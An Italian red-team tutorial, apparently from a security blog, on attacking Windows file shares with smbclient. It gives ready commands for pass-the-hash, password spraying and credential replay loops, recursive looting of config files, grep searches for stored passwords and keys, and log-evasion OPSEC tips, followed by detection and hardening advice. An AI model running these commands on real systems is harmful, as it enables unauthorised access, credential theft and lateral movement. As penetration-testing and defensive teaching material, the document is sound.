---
title: 'Smbclient: Accesso e Attacco Alle Condivisioni Windows'
slug: smbclient
description: >-
  Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB.
  Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.
image: /smbcliehnt.webp
draft: false
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - smbclient
  - smb
---

# Smbclient: Accesso e Attacco Alle Condivisioni Windows

**Durante un internal assessment, la command-line enumeration con smbclient (client SMB da riga di comando) rivela una share `\\FILESRV01\Deploy$` accessibile con un service account compromesso. L'exploitation tramite smbclient porta alla scoperta di password hardcoded in script di configurazione, abilitando privilege escalation e movimento laterale tramite riutilizzo credenziali.**

## TL;DR Operativo (Flusso a Step)

1. Enumerazione: Usa `smbclient -L` con opzioni avanzate (`-m SMB3`, `-N`) per identificare share esposte.
2. Autenticazione: Connettiti alle share con credenziali (`-U 'DOMAIN\user'`), hash NTLM (`--pw-nt-hash`) o ticket Kerberos (`-k`).
3. Ricognizione Mirata: Nella shell interattiva `smb:\>` esegui `ls`, `cd`; per enumerazione profonda usa `recurse ON`.
4. Loot Mirato: Scarica file critici con `mget *.config *.xml *.ps1` in modalità non-interattiva (`-c 'prompt OFF'`).
5. Analisi e Riutilizzo: Estrai credenziali dai file e testane il riutilizzo su altre share con `smbclient -L //nuovo_target`.
6. Movimento Laterale: Riutilizza credenziali valide con `smbclient -L //target` per enumerare nuove share e accedere a sistemi aggiuntivi.
7. Post-Compromise: Sfrutta accesso a share amministrative per raccolta di file sensibili e persistenza.

## SMBCLIENT Advanced Usage in Red Team Context

**Comandi avanzati, gestione protocolli, autenticazione alternativa e tecniche di automazione.**

**Forzatura Protocollo SMB2/3 e Negoziazione NTLMv2:**

```bash
smbclient -L //10.10.10.10 -U 'CORP\svc_backup' --option='client min protocol=SMB2'
```

In ambienti enterprise hardened, SMB1 e NTLMv1 sono spesso disabilitati. Forzare il protocollo minimo a SMB2 garantisce una negoziazione corretta con NTLMv2.

**Autenticazione con Hash NTLM (Pass-the-Hash):**

```bash
smbclient //10.10.10.10/Share -U 'CORP\Administrator' --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

In scenari di post-compromise, quando si possiede l'hash NTLM, è possibile autenticarsi senza password in chiaro, abilitando scenari di pass-the-hash.

**Autenticazione Kerberos (Post-Compromise AD):**

```bash
kinit svc_backup@CORP.LOCAL
smbclient -L //filesrv01.corp.local -k
```

Con un ticket TGT già ottenuto (es. tramite credential dumping), `-k` usa Kerberos per l'autenticazione. Riduce l'esposizione di password in rete ed è meno sospetto in ambienti AD monitorati.

**Null Session per Enumerazione Iniziale:**

```bash
smbclient -L //10.10.10.10 -N
```

Tenta una connessione senza credenziali. Se restituisce share, indica una grave misconfigurazione.

## Fase 1 – Ricognizione & Enumeration

**Enumerazione mirata delle share SMB utilizzando esclusivamente smbclient.**

**Enumerazione Base delle Share:**

```bash
smbclient -L //10.10.10.10 -U 'CORP\svc_backup' -m SMB3
```

Identifica tutte le share (`Disk`) disponibili per l'utente autenticato.

**Enumerazione Profonda: `ls` vs `recurse ON; ls`:**

```bash
# Enumerazione superficiale (singola directory)
smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'ls'
```

```bash
# Enumerazione ricorsiva (tutte le sottodirectory)
smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'recurse ON; ls'
```

* **Differenza Operativa:** Il primo comando genera un singolo Event ID 5145 per la directory root. Il secondo genera un evento 5145 per *ogni* directory e file enumerato, aumentando drasticamente il rumore nei log e il rischio di detection.

**Enumerazione con Credenziali Multiple (One-Liner):**

```bash
for user in $(cat users.txt); do smbclient -L //10.10.10.10 -U "CORP\\$user%Welcome123" -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] $user has access"; done
```

Testa rapidamente una lista di utenti con una password comune per identificare accessi validi.

## Fase 2 – Initial Exploitation

**Accesso alle share e valutazione dei permessi di lettura/scrittura tramite comandi interattivi di smbclient.**

**Accesso Interattivo e Comandi Base:**

```bash
smbclient //10.10.10.10/Data -U 'CORP\svc_backup'
```

Nella shell `smb:\>` usa:

```
smb: \> ls
smb: \> cd Finance
smb: \> recurse ON
smb: \> prompt OFF
smb: \> get report.pdf
smb: \> put canary.txt
```

**Test Permessi Scrittura in Modalità One-Liner:**

```bash
echo "PENTEST_CANARY" > test.txt && smbclient //10.10.10.10/Public -U 'CORP\svc_backup' -c 'put test.txt; del test.txt' 2>&1 | grep -v "failed"
```

Verifica rapidamente i permessi di scrittura e pulisci le tracce.

## Fase 3 – Post-Compromise & Privilege Escalation

**Analisi dei file estratti e ricerca di credenziali riutilizzabili per l'escalation.**

**Loot Mirato di File di Configurazione:**

```bash
smbclient //10.10.10.10/Deploy$ -U 'CORP\svc_backup' -c 'recurse ON; prompt OFF; mget *.config *.ini *.xml *.env 2>/dev/null'
```

**Estrazione di Credenziali dai File:**

```bash
grep -r -i -E "password|pwd=|connectionString|token=|key=" ./loot/ --include="*.{config,xml,ini}" 2>/dev/null
```

**Ricerca di Chiavi SSH e Certificati:**

```bash
find ./loot/ -type f \( -name "id_rsa" -o -name "*.pem" -o -name "*.pfx" \) 2>/dev/null
```

## Fase 4 – Lateral Movement & Pivoting

**Riutilizzo delle credenziali compromesse per accedere a nuove share e sistemi tramite smbclient.**

**Password Replay con Smbclient:**

```bash
for ip in $(cat targets.txt); do smbclient -L //$ip -U 'CORP\svc_backup%Password123!' -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] Share found on $ip"; done
```

**Accesso a Share Amministrative con Hash NTLM:**

```bash
smbclient //10.10.10.20/C$ -U 'CORP\Administrator' --pw-nt-hash <NTLM_HASH> -c 'ls'
```

Utilizza l'hash NTLM ottenuto in fase di post-compromise per tentare l'accesso a share privilegiate.

## Fase 5 – Detection & Hardening

**Indicatori di Compromissione specifici per l'uso di smbclient e mitigazioni.**

**Detection Specifica:**

* **Event ID 5145 (Detailed File Share)**: Picchi di operazioni `Read` su file `.config`, `.xml`, `.ps1` dallo stesso utente in \<60 secondi.
* **Event ID 4663 (Object Access)**: Pattern anomali di `SMB2 CREATE` seguito immediatamente da `SMB2 WRITE` (upload file sospetti).
* **Event ID 4624 (Logon Type 3)**: Logon di rete da source IP insoliti correlati ad accessi a share.
* **SMB2 WRITE Pattern**: Elevato numero di operazioni di open/write/close in breve tempo su share non destinate al file sharing utente.

**OPSEC per SMBCLIENT:**

* **Autenticazione**: Preferire l'input interattivo della password o l'uso di ticket Kerberos (`-k`) all'inline `%password`.
* **Enumerazione Profonda**: Usare `recurse ON` solo quando necessario, poiché genera un volume di log elevato.
* **Timing**: Dilazionare le operazioni di loot per evitare spike di eventi 5145/4663.
* **Loot Mirato**: Preferire `mget *.ext` a `mget *` per ridurre il numero di file trasferiti e gli eventi generati.

**Hardening Concreto:**

* **Principio del Privilegio Minimo**: Gli account di servizio devono avere accesso solo alle share necessarie, con permessi di sola lettura.
* **Abilitare e Forzare SMB Signing**: Previene attacchi di relay.
* **Auditing Avanzato**: Abilitare auditing dettagliato (Success/Failure) sulle share critiche. Monitorare le soglie per operazioni `Read/Write` anomale.
* **Disabilitare SMBv1 e NTLMv1**: Forzare l'uso di SMB2/3 e NTLMv2.
* **Segmentazione di Rete**: Isolare i file server e limitare le connessioni SMB (445/tcp) tramite firewall interno.

## Errori Comuni Che Vedo Negli Assessment Reali

* **Non forzare SMB2/3**: Causa errori di negoziazione in ambienti dove SMB1 è disabilitato.
* **Ignorare l'autenticazione Kerberos (`-k`)**: Non sfruttare ticket TGT disponibili, perdendo un'opzione più stealth.
* **Uso indiscriminato di `recurse ON`**: Genera un volume esplosivo di log 5145, aumentando esponenzialmente il rischio di detection.
* **Errata interpretazione errori**: Confondere `NT_STATUS_ACCESS_DENIED` (permessi) con `NT_STATUS_BAD_NETWORK_NAME` (share inesistente).
* **OPSEC povero**: Lasciare password in chiaro nella history dei comandi o eseguire operazioni massive in orari lavorativi.

## Mini Tabella 80/20 Finale

| Obiettivo                   | Azione                           | Comando SMBCLIENT                                                                     |
| :-------------------------- | :------------------------------- | :------------------------------------------------------------------------------------ |
| **Enumerare Share**         | Listare share disponibili        | `smbclient -L //TARGET -U 'DOMAIN\user' -m SMB3`                                      |
| **Autenticazione Hash**     | Uso NTLM hash per autenticazione | `smbclient //TARGET/Share -U user --pw-nt-hash <HASH>`                                |
| **Autenticazione Kerberos** | Usare ticket TGT                 | `kinit user; smbclient -L //target -k`                                                |
| **Loot Automatico**         | Scaricare file di configurazione | `smbclient //TARGET/Share -U 'user' -c 'recurse ON; prompt OFF; mget *.config *.xml'` |
| **Test Scrittura**          | Verificare permessi di upload    | `smbclient //TARGET/Share -U 'user' -c 'put test.txt'`                                |

**Perfeziona l'uso avanzato di smbclient, inclusa l'autenticazione via hash NTLM e Kerberos, in uno scenario di lab realistico multi-step che replica un ambiente enterprise con auditing avanzato e SMB signing abilitato.**

## 🔗 Link Interni HackITA

Approfondisci le tecniche correlate:

* [https://hackita.it/articoli/smb](https://hackita.it/articoli/smb)
* [https://hackita.it/articoli/kerberos](https://hackita.it/articoli/kerberos)
* [https://hackita.it/articoli/pass-the-hash](https://hackita.it/articoli/pass-the-hash)
* [https://hackita.it/articoli/pivoting](https://hackita.it/articoli/pivoting)

Per servizi Red Team e simulazioni realistiche in ambienti enterprise:

* [https://hackita.it/servizi](https://hackita.it/servizi)

Per supportare il progetto:

* [https://hackita.it/supporta](https://hackita.it/supporta)

***

## 🌍 Riferimenti Tecnici Ufficiali (max 3)

* [https://www.samba.org/samba/docs/current/man-html/smbclient.1.html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
* [https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145)
* [https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always)
